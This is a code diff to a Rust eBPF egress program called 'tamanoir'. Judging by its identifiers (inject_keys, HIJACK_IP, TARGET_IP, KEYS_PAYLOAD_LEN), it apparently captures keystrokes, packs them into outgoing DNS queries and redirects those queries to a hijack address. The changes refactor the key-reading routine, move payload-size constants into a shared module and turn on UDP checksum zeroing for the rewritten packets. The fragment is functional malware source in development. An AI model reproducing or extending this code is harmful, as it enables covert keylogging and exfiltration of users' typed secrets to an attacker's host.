@@ -17,14 +17,12 @@ use network_types::{
 
 use crate::common::{
     inject_keys, load_bytes, log_csums, store_bytes, update_addr, update_ip_hdr_tot_len,
-    update_port, update_udp_hdr_len, UpdateType, BPF_ADJ_ROOM_NET, DATA, DNS_QUERY_OFFSET,
-    HIJACK_IP, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
+    update_port, update_udp_hdr_len, UpdateType, BPF_ADJ_ROOM_NET, DATA, DNS_PAYLOAD_MAX_LEN,
+    DNS_QUERY_OFFSET, HIJACK_IP, KEYS_PAYLOAD_LEN, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
 };
 
 // Maps
 
-const KEYS_PAYLOAD_LEN: usize = 16; // In bytes
-const DNS_PAYLOAD_MAX_LEN: usize = 240; //power of 2 mandatory for masking
 pub struct Buf {
     pub buf: [u8; DNS_PAYLOAD_MAX_LEN + KEYS_PAYLOAD_LEN],
 }
@@ -40,12 +38,12 @@ pub fn tamanoir_egress(mut ctx: TcContext) -> i32 {
     }
 }
 
-fn read_keys() -> [u32; KEYS_PAYLOAD_LEN / 4] {
-    let key1 = DATA.pop().unwrap_or_default();
-    let key2 = DATA.pop().unwrap_or_default();
-    let key3 = DATA.pop().unwrap_or_default();
-    let key4 = DATA.pop().unwrap_or_default();
-    [key1, key2, key3, key4]
+fn read_keys() -> [u8; KEYS_PAYLOAD_LEN] {
+    let mut res = [0u8; KEYS_PAYLOAD_LEN];
+    for k in 0..KEYS_PAYLOAD_LEN {
+        res[k] = DATA.pop().unwrap_or_default() as u8;
+    }
+    res
 }
 
 fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
@@ -119,9 +117,10 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
 
                     //recompute checksum layer 4
                     //set current csum to 0
-                    // ctx.store(UDP_CSUM_OFFSET, &0u16, 2).map_err(|_| {
-                    //     error!(ctx, "error zeroing L4 csum");
-                    // })?;
+                    ctx.store(crate::common::UDP_CSUM_OFFSET, &0u16, 2)
+                        .map_err(|_| {
+                            error!(ctx, "error zeroing L4 csum");
+                        })?;
 
                     // let udp_hdr_bytes = &ctx.load::<[u8; 8]>(UDP_OFFSET).map_err(|_| ())?;
                     // let buf = unsafe {
